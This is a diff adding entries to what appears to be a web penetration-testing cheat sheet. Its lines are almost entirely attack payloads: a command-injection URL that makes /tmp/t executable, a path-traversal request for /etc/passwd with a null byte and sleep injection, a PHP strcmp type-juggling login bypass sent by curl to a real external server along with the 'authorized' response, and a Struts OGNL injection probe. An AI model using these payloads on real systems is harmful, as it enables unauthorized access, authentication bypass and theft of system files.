@@ -49,6 +49,35 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 /index.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin'.sleep(hexdec(dechex(20))).'
 {% endhighlight %}
 
+> **PHP Juggling Authentication**
+
+If the authentication code looks like this:
+
+{% highlight php %}
+<?php
+if (strcmp($_POST['password'], 'sekret') == 0) {
+    echo "Welcome, authorized user!\n";
+} else {
+    echo "Go away, imposter.\n";
+}
+?>
+{% endhighlight %}
+
+Then you could do something like this:
+
+{% highlight bash %}
+curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
+Welcome, authorized user!
+{% endhighlight %}
+
+
+> **Java Struts OGNL Injection**
+
+Look for 3 in the result:
+
+{% highlight bash %}
+http://localhost:8080/example/HelloWorld.action?message=${%{1+2}}
+{% endhighlight %}
 
 > **File Inclusion**
 
